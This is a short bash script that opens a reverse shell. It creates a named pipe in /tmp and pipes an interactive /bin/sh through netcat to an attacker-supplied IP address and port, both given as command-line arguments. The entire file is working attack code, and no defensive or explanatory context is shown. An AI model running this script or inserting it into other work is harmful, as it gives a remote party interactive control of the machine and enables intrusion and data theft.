#!/bin/bash
ATTACKER_IP=$1
PORT=$2

mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACKER_IP $PORT > /tmp/f
